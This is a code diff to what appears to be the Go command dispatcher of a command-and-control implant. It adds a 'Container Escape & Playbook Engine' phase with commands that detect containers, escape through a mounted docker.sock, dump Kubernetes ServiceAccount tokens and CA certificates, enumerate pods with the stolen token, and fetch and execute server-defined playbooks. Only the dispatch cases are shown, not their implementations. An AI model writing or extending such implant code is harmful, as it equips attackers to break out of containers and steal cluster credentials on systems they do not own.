@@ -1217,6 +1217,31 @@ func dispatch(command string) (string, string) {
 	case "extc2-status":
 		return extC2Status(), "completed"
 
+	// ── Phase 10: Container Escape & Playbook Engine ──────────────────────────
+
+	case "container-check":
+		// Detect Docker/K8s/containerd environment indicators
+		return containerCheck()
+
+	case "docker-escape":
+		// Escape via mounted docker.sock (Linux/macOS only)
+		return dockerEscape(arg)
+
+	case "k8s-sa-token":
+		// Dump mounted Kubernetes ServiceAccount JWT + CA cert
+		return k8sSAToken()
+
+	case "k8s-enum-pods":
+		// List pods in current namespace via SA token
+		return k8sEnumPods()
+
+	case "playbook-run":
+		// Fetch and execute a server-defined playbook chain
+		if arg == "" {
+			return "usage: playbook-run <playbook_id>", "failed"
+		}
+		return runPlaybook(strings.TrimSpace(arg))
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
